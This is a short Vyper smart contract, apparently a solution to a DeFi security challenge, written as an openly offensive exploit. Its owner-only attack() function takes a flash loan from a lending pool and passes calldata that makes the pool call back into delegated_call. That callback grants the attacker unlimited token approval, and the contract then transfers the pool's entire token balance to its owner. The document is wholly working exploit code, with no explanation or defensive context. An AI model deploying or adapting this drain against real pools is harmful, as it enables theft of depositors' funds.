# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IPool:
    def token() -> address: view
    def flashLoan(borrower: address, data: Bytes[68]): nonpayable

owner: immutable(address)

pool: IPool
token: address

@external
@payable
def __init__(_pool: IPool):
    owner = msg.sender
    self.pool = _pool
    self.token = self.pool.token()

@external
def attack():
    assert msg.sender == owner, "!owner"
    calldata: Bytes[68] = _abi_encode(
        self.token,
        self,
        method_id=method_id("delegated_call(address,address)"),
    )
    self.pool.flashLoan(self, calldata)
    IERC20(self.token).transferFrom(
        self.pool.address,
        msg.sender,
        IERC20(self.token).balanceOf(self.pool.address)
    )

@external
def delegated_call(_token: address, _spender: address):
    IERC20(_token).approve(_spender, max_value(uint256))    
